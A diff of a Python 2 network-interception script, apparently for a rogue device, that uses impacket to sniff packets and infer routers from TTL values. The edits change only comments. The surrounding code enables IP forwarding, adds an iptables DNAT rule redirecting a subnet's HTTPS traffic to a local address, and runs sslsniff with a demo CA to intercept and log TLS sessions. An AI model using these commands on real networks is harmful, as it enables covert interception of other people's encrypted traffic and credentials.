@@ -49,7 +49,6 @@ class DecoderThread(Thread):
     def packetHandler(self, hdr, data):
         e = self.decoder.decode(data)
         if e.get_ether_type() == impacket.ImpactPacket.IP.ethertype:
-          #print e.child().get_ip_src()
           ip = e.child()
           ttl = ip.get_ip_ttl()
           ## Uneven but not 1 or 255 ttl means it's probably coming from a router ##
@@ -298,14 +297,14 @@ if __name__ == '__main__':
             print subnet
 	    time.sleep(20)
 
-    # setup routing and dhcp on builtin ethernet
+    # setup routing 
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     time.sleep(5)
     if(sslsniff):
     	os.system("iptables -t nat -s %s -A PREROUTING  -p tcp --dport 443 -j DNAT --to-destination 169.254.44.44" % subnet.sourceaddress)
 	os.system("sslsniff -a -c /usr/lib/ssl/misc/demoCA/cacert.pem -w /root/sslsniff.log -s 443")
 
-    ## arp setup ##
+    ## passive arp  ##
     try:
 		while(1):
 		    f = open('/root/subnetinfo', 'w')
